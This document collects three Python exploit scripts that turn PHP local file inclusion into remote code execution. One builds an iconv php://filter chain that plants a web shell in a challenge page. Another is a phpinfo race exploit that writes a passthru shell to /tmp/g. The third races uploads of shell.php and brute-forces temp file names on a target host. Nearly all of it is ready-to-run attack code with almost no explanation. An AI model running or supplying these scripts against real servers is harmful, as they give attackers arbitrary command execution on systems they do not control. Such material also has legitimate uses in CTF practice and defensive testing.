## LFI2RCE.py
```python
# LFI2RCE.py

import requests

  

url = "http://localhost:8000/chall.php"

file_to_use = "/etc/passwd"

command = "id"

  

#<?=`$_GET[0]`;;?>

base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"

  

conversions = {

'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',

'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',

'C': 'convert.iconv.UTF8.CSISO2022KR',

'8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',

'9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',

'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',

's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',

'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',

'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',

'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',

'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',

'0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',

'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',

'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',

'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',

'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',

'7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',

'4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'

}

  
  

# generate some garbage base64

filters = "convert.iconv.UTF8.CSISO2022KR|"

filters += "convert.base64-encode|"

# make sure to get rid of any equal signs in both the string we just generated and the rest of the file

filters += "convert.iconv.UTF8.UTF7|"

  
  

for c in base64_payload[::-1]:

filters += conversions[c] + "|"

# decode and reencode to get rid of everything that isn't valid base64

filters += "convert.base64-decode|"

filters += "convert.base64-encode|"

# get rid of equal signs

filters += "convert.iconv.UTF8.UTF7|"

  

filters += "convert.base64-decode"

  

final_payload = f"php://filter/{filters}/resource={file_to_use}"

  

with open('payload', 'w') as f:

f.write(final_payload)

  

r = requests.get(url, params={

"0": command,

"action": "include",

"file": final_payload

})

  

print(r.text)
```

## phpinfolfi.py
```python
# phpinfolfi.py
#!/usr/bin/python

# https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf

# The following line is not required but supposedly optimizes code.

# However, this breaks on some Python 2 installations, where the future module version installed is > 0.16. This can be a pain to revert.

# from builtins import range

from __future__ import print_function

import sys

import threading

import socket

  

def setup(host, port):

TAG="Security Test"

PAYLOAD="""%s\r

<?php $c=fopen('/tmp/g','w');fwrite($c,'<?php passthru($_GET["f"]);?>');?>\r""" % TAG

REQ1_DATA="""-----------------------------7dbff1ded0714\r

Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r

Content-Type: text/plain\r

\r

%s

-----------------------------7dbff1ded0714--\r""" % PAYLOAD

padding="A" * 5000

REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r

Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r

HTTP_ACCEPT: """ + padding + """\r

HTTP_USER_AGENT: """+padding+"""\r

HTTP_ACCEPT_LANGUAGE: """+padding+"""\r

HTTP_PRAGMA: """+padding+"""\r

Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r

Content-Length: %s\r

Host: %s\r

\r

%s""" %(len(REQ1_DATA),host,REQ1_DATA)

#modify this to suit the LFI script

LFIREQ="""GET /lfi.php?load=%s%%00 HTTP/1.1\r

User-Agent: Mozilla/4.0\r

Proxy-Connection: Keep-Alive\r

Host: %s\r

\r

\r

"""

return (REQ1, TAG, LFIREQ)

  

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  

s.connect((host, port))

s2.connect((host, port))

  

s.send(phpinforeq)

d = ""

while len(d) < offset:

d += s.recv(offset)

try:

i = d.index("[tmp_name] =>")

fn = d[i+17:i+31]

except ValueError:

return None

  

s2.send(lfireq % (fn, host))

d = s2.recv(4096)

s.close()

s2.close()

  

if d.find(tag) != -1:

return fn

  

counter=0

class ThreadWorker(threading.Thread):

def __init__(self, e, l, m, *args):

threading.Thread.__init__(self)

self.event = e

self.lock = l

self.maxattempts = m

self.args = args

  

def run(self):

global counter

while not self.event.is_set():

with self.lock:

if counter >= self.maxattempts:

return

counter+=1

  

try:

x = phpInfoLFI(*self.args)

if self.event.is_set():

break

if x:

print("\nGot it! Shell created in /tmp/g")

self.event.set()

  

except socket.error:

return

  
  

def getOffset(host, port, phpinforeq):

"""Gets offset of tmp_name in the php output"""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host,port))

s.send(phpinforeq)

  

d = ""

while True:

i = s.recv(4096)

d+=i

if i == "":

break

# detect the final chunk

if i.endswith("0\r\n\r\n"):

break

s.close()

i = d.find("[tmp_name] =>")

if i == -1:

raise ValueError("No php tmp_name in phpinfo output")

  

print("found %s at %i" % (d[i:i+10],i))

# padded up a bit

return i+256

  

def main():

  

print("LFI With PHPInfo()")

print("-=" * 30)

  

if len(sys.argv) < 2:

print("Usage: %s host [port] [threads]" % sys.argv[0])

sys.exit(1)

  

try:

host = socket.gethostbyname(sys.argv[1])

except socket.error as e:

print("Error with hostname %s: %s" % (sys.argv[1], e))

sys.exit(1)

  

port=80

try:

port = int(sys.argv[2])

except IndexError:

pass

except ValueError as e:

print("Error with port %d: %s" % (sys.argv[2], e))

sys.exit(1)

  

poolsz=10

try:

poolsz = int(sys.argv[3])

except IndexError:

pass

except ValueError as e:

print("Error with poolsz %d: %s" % (sys.argv[3], e))

sys.exit(1)

  

print("Getting initial offset...", end=' ')

reqphp, tag, reqlfi = setup(host, port)

offset = getOffset(host, port, reqphp)

sys.stdout.flush()

  

maxattempts = 1000

e = threading.Event()

l = threading.Lock()

  

print("Spawning worker pool (%d)..." % poolsz)

sys.stdout.flush()

  

tp = []

for i in range(0,poolsz):

tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

  

for t in tp:

t.start()

try:

while not e.wait(1):

if e.is_set():

break

with l:

sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))

sys.stdout.flush()

if counter >= maxattempts:

break

print()

if e.is_set():

print("Woot! \m/")

else:

print(":(")

except KeyboardInterrupt:

print("\nTelling threads to shutdown...")

e.set()

  

print("Shuttin' down...")

for t in tp:

t.join()

  

if __name__=="__main__":

print("Don't forget to modify the LFI URL")

main()
```

## uploadlfi.py
```python
# uploadlif.py
from __future__ import print_function

from builtins import range

import itertools

import requests

import string

import sys

  

print('[+] Trying to win the race')

f = {'file': open('shell.php', 'rb')}

for _ in range(4096 * 4096):

requests.post('http://target.com/index.php?c=index.php', f)

  
  

print('[+] Bruteforcing the inclusion')

for fname in itertools.combinations(string.ascii_letters + string.digits, 6):

url = 'http://target.com/index.php?c=/tmp/php' + fname

r = requests.get(url)

if 'load average' in r.text: # <?php echo system('uptime');

print('[+] We have got a shell: ' + url)

sys.exit(0)

  

print('[x] Something went wrong, please try again')
```